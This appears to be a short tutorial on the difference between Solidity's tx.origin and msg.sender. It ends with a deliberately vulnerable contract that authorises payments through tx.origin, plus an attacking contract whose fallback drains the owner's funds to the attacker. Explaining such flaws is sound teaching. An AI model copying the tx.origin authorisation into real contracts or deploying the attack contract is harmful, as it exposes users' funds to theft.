## Tx.Orign Vs Msg.Sender (Attack Scenario)

tx.origin and msg.sender are global variables used in solidity for wrting smart contracts. while tx.origin refers to the originating account that started a transaction, msg.sender refers to the immediate address that invokes a function.

In solidity, there are two kinds of account, Externally owned accounts and contract account. Externally owned Accounts are such accounts created from wallets like metamask that has a private key associated with them, while contract accounts refer the address of a deployed smart contract, such accounts have no private key assigned to them.

tx.origin will always refer to an Externally owned account (EOA), since only an EOA can initiate a transaction while msg.sender can both refer to an EOA and also a contract address based on the calling context.

As per usage, tx.origin and msg.sender can point to totally different address based on the context used. for example when an account A calls a contract B and contract B calls another contract C.
in the calling context, the msg.sender for contract C will be Contract B's address while the tx.origin of contract C will be the original account A. whewww such a wrap!!

This pose a problem when use for authorization purposes as irrespective fo the calling contract, tx.origin will always refer to the address of the account that initiated the transaction and this can be exploited as seen in the contract below.

```

contract MyContract {

    address owner;

    function MyContract() public {
        owner = msg.sender;
    }

    function sendTo(address receiver, uint amount) public {
        require(tx.origin == owner);
        (bool success, ) = receiver.call.value(amount)("");
        require(success);
    }

}

contract AttackingContract {

    MyContract myContract;
    address attacker;

    function AttackingContract(address myContractAddress) public {
        myContract = MyContract(myContractAddress);
        attacker = msg.sender;
    }

    function() public {
        myContract.sendTo(attacker, msg.sender.balance);
    }

}
```